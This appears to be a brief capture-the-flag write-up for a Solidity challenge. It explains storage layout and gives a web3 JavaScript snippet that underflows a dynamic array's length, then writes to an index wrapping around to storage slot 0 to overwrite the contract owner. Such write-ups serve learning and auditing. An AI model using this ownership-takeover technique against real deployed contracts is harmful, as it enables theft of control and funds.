dynamic arrays store the length of the array in the storage slot, and the items are placed beginning at slot `soliditySha3(slot number)`.
we can overflow the array index to access memory slot 0 by accesing index `2 ** 256 - 1 - soliditySha3(slot number) + 1` and overwrite the owner.

```
const arraySlot = web3.utils.soliditySha3('0x0000000000000000000000000000000000000000000000000000000000000001')
const offset = new BN('2').pow(new BN('256')).sub(web3.utils.toBN(arraySlot));

const data = await web3.eth.getStorageAt(instance, 0);
const newData = data.slice(0, 26) + player.slice(2, player.length);

await contract.retract(); // array length is overflown so we can skip bounds check

await contract.revise(offset, newData);
```

[1] https://enderspub.kubertu.com/understand-solidity-storage-in-depth

